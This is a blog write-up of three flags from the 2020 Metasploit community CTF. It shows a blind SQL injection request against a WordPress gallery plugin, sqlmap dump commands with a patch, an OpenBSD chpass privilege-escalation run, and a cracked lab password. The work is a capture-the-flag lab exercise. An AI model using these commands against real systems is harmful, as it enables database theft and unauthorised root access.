Metasploit community CTF 2020 write up
######################################
:date: 2020-02-05
:author: Thomas Van Doren
:category: ctf
:tags: ctf, security
:slug: metasploit-2020-writeup

This past weekend I worked on the `Metasploit community CTF <https://blog.rapid7.com/2020/01/15/announcing-the-2020-metasploit-community-ctf/>`_ with the `CTF_Circle team <https://twitter.com/CTF_Circle>`_. As a group we finished 9th overall! The rest of this post includes a write up of three flags the team captured (out of the seven total). Capturing all three of these flags was a collaborative team effort, which is one of the highlights for me of working with CTF_Circle.

.. image:: /images/metasploit-2020-tweet.png
    :target: https://twitter.com/CTF_Circle/status/1224382463599767552
    :width: 75%
    :align: center

Background
----------

This CTF (`capture the flag <https://en.wikipedia.org/wiki/Capture_the_flag#Computer_security>`_) provided teams with two EC2 instances: a Kali Linux jump box and a target box. The target box ran several services that hid PNG images of playing cards that were the flags. Exploiting vulnerabilites, or in some cases sniffing traffic, enabled us to find the flags. Once we found a flag, we submitted the md5 checksum to get points.

Queen of Hearts
---------------

Using nmap, we found that port 8000 on the target box was running a WordPress site about Giraffes::

    $ nmap -A target
    ...
    8000/tcp  open   http         Apache httpd 2.4.38 ((Debian))
    |_http-generator: WordPress 5.3.2
    |_http-open-proxy: Proxy might be redirecting requests
    |_http-server-header: Apache/2.4.38 (Debian)
    |_http-title: Lovely Giraffes &#8211; Everything about giraffes&#8230;
    |_http-trane-info: Problem with XML parsing of /evox/about

The WordPress site has WP_SITEURL set to ``http://127.0.0.1:8000``, which meant that all the subresources (e.g. scripts, style sheets, images) did not load and that links were broken. Adding a rewrite rule in Burp Suite to rewrite these urls back to ``http://target:8000`` fixed the links.

Visiting the site showed a Giraffe gallery site. Poking around there was a single post with a comment that referenced the password.

::

    $ curl target:8000/?page_id=2 | grep comments
    ... target:8000/?feed=comments-rss2 ...
    $ curl target:8000/?feed=comments-rss2 | grep password # refers to melman
    > Hey! I forgot to say, your account &#8220;melman&#8221; is still valid with the the same password, your last name.

Googling melman leads to the Madagascar movie character: `Melman Mankiewicz III <https://en.wikipedia.org/wiki/List_of_Madagascar_(franchise)_characters#Melman>`_. So the WordPress username and password are: melman/mankiewicz. These can be used at ``http://target:8000/wp-admin`` to sign in. The melman user did not have permission to upload plugins. The Nextgen Gallery was installed, version 3.2.10, and it has a `blind SQL injection vulnerability <https://wpvulndb.com/vulnerabilities/9816>`_!

::

    $ curl target:8000/ | grep wp-content/plugins
    <link rel='stylesheet' id='nextgen_widgets_style-css'  href='http://127.0.0.1:8000/wp-content/plugins/nextgen-gallery/products/photocrati_nextgen/modules/widget/static/widgets.css?ver=3.2.10' type='text/css' media='all' />

Exploiting the SQLi vulnerability required creating a new post, attaching a nextgen gallery, and then sorting the images in the gallery, which triggered a POST request to the backend that has the SQLi vulnerability.

::

    POST /index.php?photocrati_ajax=1 HTTP/1.1
    ...
    Cookie: wordpress_test_cookie=WP+Cookie+check;...

    action=get_displayed_gallery_entities&limit=5000&offset=0&nonce=2900d93354&displayed_gallery%5Bsource%5D=galleries&displayed_gallery%5Bcontainer_ids%5D%5B%5D=2&displayed_gallery%5Bdisplay_type%5D=photocrati-nextgen_basic_thumbnails&displayed_gallery%5Bslug%5D=&displayed_gallery%5Border_by%5D=img&displayed_gallery%5Border_direction%5D=ASC&displayed_gallery%5Breturns%5D=included&displayed_gallery%5Bmaximum_entity_count%5D=500&displayed_gallery%5B__defaults_set%5D=true

The ``displayed_gallery%5Border_by%5D=img`` post parameter is exploitable as a `blind SQL injection <https://owasp.org/www-community/attacks/Blind_SQL_Injection>`_. Using `sqlmap <http://sqlmap.org/>`_ we can use the blind injection to find data in the database. We set ``displayed_gallery%5Border_by%5D=%INJECT HERE%`` in the request body given to sqlmap and otherwise copy+pasted the raw request from burp. This is the command we ran to enumerate databases (we know wordpress uses mysql) and tables in the database server.

::

    $ sqlmap -r req.txt --dbms=mysql --level=5 --risk=3 --dump --threads=10 --hex --technique=BEUQ --tamper=between,randomcase,space2comment --dbs --tables

That showed there was a database called ``flag_card`` (in addition to the ``wordpress`` database) with a table called ``card``. Using sqlmap we can dump that table, which showed that there was a value in the ``image`` column that was >90k long and it started calculating the value.

::

    sqlmap -r req.txt --dbms=mysql --level=5 --risk=3 --dump --threads=10 --hex --technique=BEUQ --tamper=between,randomcase,space2comment -D flag_card -T card

Using the blind SQLi it was calculating ~1 character/second, so this was going to take 25+ hours. That's when `echo had a brilliant suggestion <https://twitter.com/nemesis09/status/1224401072225161216>`_ to md5 the content in the database, then brute force the md5 sum since that is only 32 characters. We patched sqlmap to always wrap the image column in a MD5() call (please `tweet me <https://twitter.com/thomasvandoren>`_ if there is a better way to do this with sqlmap!)::

    diff --git a/lib/core/agent.py b/lib/core/agent.py
    index aad9db4b0..189262695 100644
    --- a/lib/core/agent.py
    +++ b/lib/core/agent.py
    @@ -595,6 +595,9 @@ class Agent(object):
            Note: used primarily in dumping of custom tables
            """
                                    
    +        if field == 'image':      
    +            return 'MD5(image)'   
    +                                  
            retVal = field            
            if conf.db and table and conf.db in table:                    
                table = table.split(conf.db)[-1].strip('.')               

Rerunning the sqlmap command with this patch, it finished very quickly and displayed the card name and md5, which we submitted!

::

    Database: flag_card
    Table: card
    [1 entry]
    +----+-----------------+----------------------------------+
    | id | name            | image                            |
    +----+-----------------+----------------------------------+
    | 1  | Queen of Hearts | 111b62aef6e0a5ea78fe7485fc9b3333 |
    +----+-----------------+----------------------------------+

7 of Diamonds
-------------

Capturing this flag started with capturing the `2 of Diamonds <http://tinkerfairy.net/2-of-diamonds.txt>`_ flag, which was a repeat from the 2018 Metasploit community CTF. We downloaded the /etc/passwd file from the target 4.3BSD/VAX system and then ran `John the Ripper <https://www.openwall.com/john/>`_ over it to get passwords. These passwords enabled us to SSH into port 22 on the target box::

    $ nmap -A target
    ...
    22/tcp    open   ssh          OpenSSH 8.1 (protocol 2.0)
    | ssh-hostkey: 
    |   3072 44:88:8c:e3:81:67:0e:5c:84:2e:54:b8:8f:17:b4:48 (RSA)
    |   256 08:7a:50:9d:67:c9:25:20:89:07:85:98:c0:34:9c:9f (ECDSA)
    |_  256 ad:df:2c:68:bc:12:49:75:c6:d4:05:5c:f5:d2:6b:be (ED25519)

That was an OpenBSD 6.6 system. The ``ken`` user was in the wheel group and Ken's password is `Ken Thompson's Unix password <https://leahneukirchen.org/blog/archive/2019/10/ken-thompson-s-unix-password.html>`_. Signing in as Ken, we were able to exploit `a privilege escalation <https://www.openwall.com/lists/oss-security/2019/12/11/9>`_ to gain root access to the system (signing in as any user would have worked), and after some searching found a bare git repo at ``/root/hai``. There is also `a RCE in OpenSMTPd in this version of OpenBSD <https://www.openwall.com/lists/oss-security/2020/01/28/3>`_ that would have enabled root access.

::

    $ ssh ken@target # password: p/q2-q4!
    $ cd exp
    $ ./exp /usr/bin/chpass
    # cd /root
    # file hai
    hai: Git bundle

We copied that bare git repo back to the jump box and then were able to generate the 7 of Diamonds by concatenating the ``/whats-this`` file from: the master branch, then the nothing-to-see-here branch, and finally from a base64 encoded blob in a commit message in the nothing-to-see-here branch. Opening just the ``/whats-this`` this file from master only showed about half of the card, so this was a fun challenge to get the other pieces!

::

    $ git clone hai hai-clone
    $ cd hai-clone
    $ cat whats-this > 7-of-diamonds.png
    $ git branch -r
      origin/HEAD -> origin/master
      origin/master
      origin/nothing-to-see-here
    $ git checkout nothing-to-see-here
    $ cat whats-this >> 7-of-diamonds.png
    $ git log # then scroll through the log messages to find a base64 text wall
    $ git log --format=%B -n 1 7cadeef01e867da960cae432000796879b77f59a | base64 -d >> 7-of-diamonds.png
    $ md5sum 7-of-diamonds.png
    ca7c8f05fc082f0b2127dd0a40c80f21  7-of-diamonds.png

.. image:: /images/metasploit-2020-7-of-diamonds.png
    :alt: 7-of-diamonds.png

Ace of Spades
-------------

Another file we found while searching the OpenBSD system was ``/etc/flag``, which was ``hexdump -C`` output of a PNG file::

    $ head -1 /etc/flag
    00000000  89 50 4e 47 0d 0a 1a 0a  00 00 00 0d 49 48 44 52  |.PNG........IHDR|
    ...

We copied that to kali as `etcflag` and then used this python code to remove everything except the hex.

.. code-block:: python

    with open('etcflag') as fp:
        with open('etcflag.just_hex', 'w') as fp2:
            for l in fp.readlines():
                fp2.write(l[10:58])
                fp2.write('\n')

Then we reversed the hex with xxd to get the original image and the flag!

::

    $ xxd -p -r etcflag.just_hex ace-of-spades.png
    $ md5sum ace-of-spades.png
    eb8166c746b9f66297174e9073ce0fea  ace-of-spades.png

.. image:: /images/metasploit-2020-ace-of-spades.png
    :alt: ace-of-spades.png
